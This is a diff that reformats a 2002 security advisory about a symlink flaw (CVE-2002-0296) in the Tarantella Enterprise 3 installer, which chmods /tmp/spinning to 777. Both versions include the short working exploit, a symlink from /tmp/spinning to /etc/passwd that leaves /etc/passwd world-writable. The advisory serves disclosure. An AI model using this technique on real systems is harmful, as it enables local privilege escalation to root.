@@ -1,41 +1,49 @@
-                                Advisory #: 45
-Title: Another local root during installation of Tarantella Enterprise 3
-Author:Larry W. Cashdollar, @_larry0
-Date: 2002-01-14
-Download Site: http://www.tarantella.com/download
-Vendor:http://www.tarantella.com
-Vendor Notified: 2002-01-14
-Vendor Contact: unkown
-Description: Tarantella, a supplier of Internet infrastructure software, has
-released Tarantella Enterprise 3, version 3.2, positioned as a managed, secure
-application access product that provides authorization, authentication, and
-accountability for enterprise systems. The software supplies integrated,
-managed, and secure access to server-based applications through a Web browser.
-This iteration of the Tarantella software focuses on security, performance, and
-network optimization while allowing fast and simple integration with existing
-corporate infrastructures.
-Vulnerability:
-During installation a "twirling / \ | - " text graphic is displayed (you
-remember them from the shareware games in DOS days..) they create a file in /
-tmp called spinning to determine at what state the installation is at. The
-files permissions are changed toread write excute for all, removed and
-recreated during different stages of the installation. It is vulnerabile to a
-simple symlink attack. Problem Code: <----snip----> touch /tmp/spinning >/dev/
-null 2>&1 chmod 777 /tmp/spinning >/dev/null 2>&1 <----snip---->
-CVE-2002-0296
-JSON:Export
-Exploit Code:
-   1. Exploit
-   2. There is no race condition here, just create the link.
-   3. [lwc@misery] ln -s /etc/passwd /tmp/spinning
-   4.  
-   5. Wait until root is done installing...
-   6.  
-   7. [lwc@misery] ls -l /etc/passwd
-   8. - -rwxrwxrwx 1 root root 1094 Feb 18 22:39 /etc/passwd
-   9.  
-  10.  
-  11.  
-Screen Shots:
-Advisory: http://www.vapid.dhs.org/advisories/
-tarentella_enterprise_3_symlink_attack.html
+
+                               Advisory #: 45
+
+   Title: Another local root during installation of Tarantella Enterprise
+   3
+   Author: Larry W. Cashdollar, @_larry0
+   Date: 2002-01-14
+   Download Site: http://www.tarantella.com/download
+   Vendor: http://www.tarantella.com
+   Vendor Notified: 2002-01-14
+   Vendor Contact: unkown
+   Description: Tarantella, a supplier of Internet infrastructure
+   software, has released Tarantella Enterprise 3, version 3.2, positioned
+   as a managed, secure application access product that provides
+   authorization, authentication, and accountability for enterprise
+   systems. The software supplies integrated, managed, and secure access
+   to server-based applications through a Web browser. This iteration of
+   the Tarantella software focuses on security, performance, and network
+   optimization while allowing fast and simple integration with existing
+   corporate infrastructures.
+   Vulnerability:
+   During installation a "twirling / \ | - " text graphic is displayed
+   (you remember them from the shareware games in DOS days..) they create
+   a file in /tmp called spinning to determine at what state the
+   installation is at. The files permissions are changed toread write
+   excute for all, removed and recreated during different stages of the
+   installation. It is vulnerabile to a simple symlink attack. Problem
+   Code: <----snip----> touch /tmp/spinning >/dev/null 2>&1 chmod 777
+   /tmp/spinning >/dev/null 2>&1 <----snip---->
+   CVE-2002-0296
+   JSON: Export
+   Exploit Code:
+
+    1. Exploit
+    2. There is no race condition here, just create the link.
+    3. [lwc@misery] ln -s /etc/passwd /tmp/spinning
+    4.
+    5. Wait until root is done installing...
+    6.
+    7. [lwc@misery] ls -l /etc/passwd
+    8. - -rwxrwxrwx 1 root root 1094 Feb 18 22:39 /etc/passwd
+    9.
+   10.
+   11.
+
+   Screen Shots:
+   Advisory:
+   http://www.vapid.dhs.org/advisories/tarentella_enterprise_3_symlink_att
+   ack.html
